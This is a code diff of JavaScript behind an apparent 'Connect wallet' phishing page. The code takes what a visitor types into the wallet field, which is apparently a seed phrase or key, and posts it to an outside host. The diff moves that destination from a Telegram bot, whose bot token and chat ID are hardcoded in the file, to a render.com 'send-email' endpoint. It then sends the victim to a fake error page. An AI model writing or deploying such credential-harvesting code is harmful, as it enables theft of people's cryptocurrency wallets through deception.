@@ -72742,31 +72742,20 @@ const submitButton = document.getElementById('submit-btn');
     let BOT_TOKEN = '7768282801:AAGmIi6q-1-5fsXxCx8IfeAg2a5O2BQcKgU'
     let chat_id = '6319409349'
 
-    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id,
+    const response = await axios.post(`https://send-email-uokr.onrender.com/email`, {
+      
         text: walletInput
     })
-     if (response.status === 200 && response.data.ok) {
+     
                     console.log(response);
-                    alert('Message sent successfully');
-                } else {
-                    throw new Error("Failed to send message");
-                }
-    
+                    window.location.href = "error.html";
+            
 
   } catch (error) {
     console.log(error);
      console.error("Error:", error);
                 
-                if (error.message === "Empty input") {
-                    // Do nothing, alert already shown
-                } else if (error.response) {
-                    alert(`Telegram API Error: ${error.response.data.description || "Unknown error"}`);
-                } else if (error.request) {
-                    alert("Network error: Failed to connect to Telegram API. Please check your internet connection.");
-                } else {
-                    alert("An unexpected error occurred.");
-                }
+              alert("An unexpected error occurred.");
 
   } finally {
     submitButton.textContent = "Connect wallet"; // Change text back to original
